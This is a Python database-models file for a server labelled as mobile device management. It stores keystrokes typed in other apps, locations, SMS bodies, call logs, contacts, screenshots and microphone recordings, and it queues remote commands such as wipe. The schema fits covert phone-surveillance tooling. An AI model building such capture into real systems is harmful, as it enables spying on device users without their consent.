from datetime import datetime
from config.database import db
import ast
import json


class Device(db.Model):
    __tablename__ = 'devices'

    device_id = db.Column(db.String(255), primary_key=True)
    device_ip = db.Column(db.String(255), nullable=False)
    last_seen = db.Column(db.DateTime, default=datetime.now)
    user_id = db.Column(db.String(40), db.ForeignKey('users.id'), nullable=True)
    fcm_token = db.Column(db.String(512), nullable=True)
    device_name = db.Column(db.String(255), nullable=True)
    status = db.Column(db.String(20), default='offline')  # online, offline
    group_id = db.Column(db.Integer, db.ForeignKey('device_groups.id'), nullable=True)

    # Relationships
    device_info = db.relationship('DeviceInfo', backref='device', lazy=True)
    keystrokes = db.relationship('Keystroke', backref='device', lazy=True)
    locations = db.relationship('DeviceLocation', backref='device', lazy=True)
    apps = db.relationship('AppInfo', backref='device', lazy=True)
    call_logs = db.relationship('CallLog', backref='device', lazy=True)
    contacts = db.relationship('Contact', backref='device', lazy=True)
    sms_messages = db.relationship('SMSMessage', backref='device', lazy=True)
    commands = db.relationship('Command', backref='device', lazy=True)

    def to_dict(self):
        return {
            'device_id': self.device_id,
            'device_ip': self.device_ip,
            'last_seen': self.last_seen.isoformat() if self.last_seen else None,
            'user_id': self.user_id,
            'fcm_token': self.fcm_token,
            'device_name': self.device_name,
            'status': self.status,
            'group_id': self.group_id,
        }


class DeviceInfo(db.Model):
    __tablename__ = 'device_info'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey(
        'devices.device_id'), nullable=False)
    # device_info, battery_info, sim_info, os_info
    info_type = db.Column(db.String(50), nullable=False)
    data = db.Column(db.Text, nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        try:
            parsed_data = ast.literal_eval(self.data)
        except Exception:
            parsed_data = {}
        return {
            'id': self.id,
            'device_id': self.device_id,
            'info_type': self.info_type,
            'timestamp': self.timestamp,
            ** parsed_data
        }


class Keystroke(db.Model):
    __tablename__ = 'keystrokes'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey(
        'devices.device_id'), nullable=False)
    package_name = db.Column(db.String(255))
    text = db.Column(db.Text)
    # TEXT_CHANGE, CLICK, DOUBLE_CLICK, LONG_CLICK, SELECTED
    event_type = db.Column(db.String(50))
    timestamp = db.Column(db.DateTime, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'package_name': self.package_name,
            'text': self.text,
            'event_type': self.event_type,
            'timestamp': self.timestamp,
            'created_at': self.created_at,
        }


class DeviceLocation(db.Model):
    __tablename__ = 'device_locations'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey(
        'devices.device_id'), nullable=False)
    latitude = db.Column(db.Float, nullable=False)
    longitude = db.Column(db.Float, nullable=False)
    accuracy = db.Column(db.Float)
    timestamp = db.Column(db.DateTime, nullable=False)
    provider = db.Column(db.String(50))
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'latitude': self.latitude,
            'longitude': self.longitude,
            'accuracy': self.accuracy,
            'timestamp': self.timestamp,
            'provider': self.provider,
            'created_at': self.created_at,
        }


class AppInfo(db.Model):
    __tablename__ = 'apps_info'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey(
        'devices.device_id'), nullable=False)
    package_name = db.Column(db.String(255), nullable=False)
    app_name = db.Column(db.String(255))
    app_version = db.Column(db.String(255))
    is_system_app = db.Column(db.Boolean, default=False)
    is_enabled = db.Column(db.Boolean, default=True)
    install_time = db.Column(db.DateTime)
    last_used_time = db.Column(db.DateTime)
    # Total time in foreground in milliseconds
    total_time_in_foreground = db.Column(db.Integer)
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'package_name': self.package_name,
            'app_name': self.app_name,
            'app_version': self.app_version,
            'is_system_app': self.is_system_app,
            'is_enabled': self.is_enabled,
            'install_time': self.install_time,
            'last_used_time': self.last_used_time,
            'total_time_in_foreground': self.total_time_in_foreground,
            'created_at': self.created_at,
        }


class CallLog(db.Model):
    __tablename__ = 'call_logs'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey(
        'devices.device_id'), nullable=False)
    phone_number = db.Column(db.String(50), nullable=False)
    contact_name = db.Column(db.String(255))
    call_type = db.Column(db.String(20))  # INCOMING, OUTGOING, MISSED
    duration = db.Column(db.Integer)  # Duration in seconds
    timestamp = db.Column(db.DateTime, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'phone_number': self.phone_number,
            'contact_name': self.contact_name,
            'call_type': self.call_type,
            'duration': self.duration,
            'timestamp': self.timestamp,
            'created_at': self.created_at,
        }


class Contact(db.Model):
    __tablename__ = 'contacts'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey(
        'devices.device_id'), nullable=False)
    name = db.Column(db.String(255), nullable=False)
    phone_numbers = db.Column(db.Text)  # Stored as JSON string
    last_updated = db.Column(db.DateTime, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'name': self.name,
            'phone_numbers': self.phone_numbers,
            'last_updated': self.last_updated,
            'created_at': self.created_at,
        }


class Screenshot(db.Model):
    __tablename__ = 'screenshots'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
    filename = db.Column(db.String(255), nullable=False)
    file_url = db.Column(db.String(512), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'filename': self.filename,
            'file_url': self.file_url,
            'created_at': self.created_at,
        }


class MicRecording(db.Model):
    __tablename__ = 'mic_recordings'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
    filename = db.Column(db.String(255), nullable=False)
    file_url = db.Column(db.String(512), nullable=False)
    duration_seconds = db.Column(db.Integer)
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'filename': self.filename,
            'file_url': self.file_url,
            'duration_seconds': self.duration_seconds,
            'created_at': self.created_at,
        }


class DeviceNotification(db.Model):
    __tablename__ = 'device_notifications'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
    user_id = db.Column(db.String(40), db.ForeignKey('users.id'), nullable=True)
    # Types: new_sms, new_call, new_location, new_keystrokes, device_online, device_offline
    event_type = db.Column(db.String(50), nullable=False)
    message = db.Column(db.String(255), nullable=False)
    is_read = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'event_type': self.event_type,
            'message': self.message,
            'is_read': self.is_read,
            'created_at': self.created_at.isoformat() if self.created_at else None,
        }


class SMSMessage(db.Model):
    __tablename__ = 'sms_messages'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey(
        'devices.device_id'), nullable=False)
    phone_number = db.Column(db.String(50), nullable=False)
    contact_name = db.Column(db.String(255))
    message_type = db.Column(db.String(20))  # INBOX, SENT, DRAFT, OUTBOX
    message_body = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'phone_number': self.phone_number,
            'contact_name': self.contact_name,
            'message_type': self.message_type,
            'message_body': self.message_body,
            'timestamp': self.timestamp,
            'created_at': self.created_at,
        }


# ── MDM Command Queue ────────────────────────────────────────────────────────

class Command(db.Model):
    __tablename__ = 'commands'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
    command_type = db.Column(db.String(50), nullable=False)
    # LOCK_DEVICE, WIPE_DEVICE, REBOOT_DEVICE, INSTALL_APP,
    # START_KIOSK_MODE, STOP_KIOSK_MODE, GET_LOCATION, GET_DEVICE_INFO,
    # GET_BATTERY_INFO, GET_CONTACTS, GET_SMS, GET_CALL_LOGS, GET_APPS
    payload = db.Column(db.Text, default='{}')  # JSON string
    status = db.Column(db.String(20), default='PENDING')
    # PENDING, SENT, DELIVERED, EXECUTED, FAILED
    result = db.Column(db.Text, nullable=True)  # JSON response from device
    created_by = db.Column(db.String(40), nullable=True)  # admin/user id
    created_at = db.Column(db.DateTime, default=datetime.now)
    sent_at = db.Column(db.DateTime, nullable=True)
    executed_at = db.Column(db.DateTime, nullable=True)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'command_type': self.command_type,
            'payload': json.loads(self.payload) if self.payload else {},
            'status': self.status,
            'result': self.result,
            'created_by': self.created_by,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'sent_at': self.sent_at.isoformat() if self.sent_at else None,
            'executed_at': self.executed_at.isoformat() if self.executed_at else None,
        }


# ── Device Groups ─────────────────────────────────────────────────────────────

class DeviceGroup(db.Model):
    __tablename__ = 'device_groups'

    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False, unique=True)
    description = db.Column(db.String(255), nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.now)

    devices = db.relationship('Device', backref='group', lazy=True)
    policies = db.relationship('Policy', backref='group', lazy=True)

    def to_dict(self):
        return {
            'id': self.id,
            'name': self.name,
            'description': self.description,
            'device_count': len(self.devices) if self.devices else 0,
            'created_at': self.created_at.isoformat() if self.created_at else None,
        }


# ── Policies ──────────────────────────────────────────────────────────────────

class Policy(db.Model):
    __tablename__ = 'policies'

    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.String(255), nullable=True)
    rules_json = db.Column(db.Text, default='{}')  # JSON rules
    group_id = db.Column(db.Integer, db.ForeignKey('device_groups.id'), nullable=True)
    is_active = db.Column(db.Boolean, default=True)
    created_at = db.Column(db.DateTime, default=datetime.now)
    updated_at = db.Column(db.DateTime, default=datetime.now, onupdate=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'name': self.name,
            'description': self.description,
            'rules': json.loads(self.rules_json) if self.rules_json else {},
            'group_id': self.group_id,
            'is_active': self.is_active,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'updated_at': self.updated_at.isoformat() if self.updated_at else None,
        }


# ── Audit Log ─────────────────────────────────────────────────────────────────

class AuditLog(db.Model):
    __tablename__ = 'audit_logs'

    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.String(40), nullable=True)
    action = db.Column(db.String(100), nullable=False)
    target_type = db.Column(db.String(50), nullable=True)  # device, command, policy, etc
    target_id = db.Column(db.String(255), nullable=True)
    details = db.Column(db.Text, nullable=True)  # JSON
    ip_address = db.Column(db.String(50), nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'action': self.action,
            'target_type': self.target_type,
            'target_id': self.target_id,
            'details': self.details,
            'ip_address': self.ip_address,
            'created_at': self.created_at.isoformat() if self.created_at else None,
        }
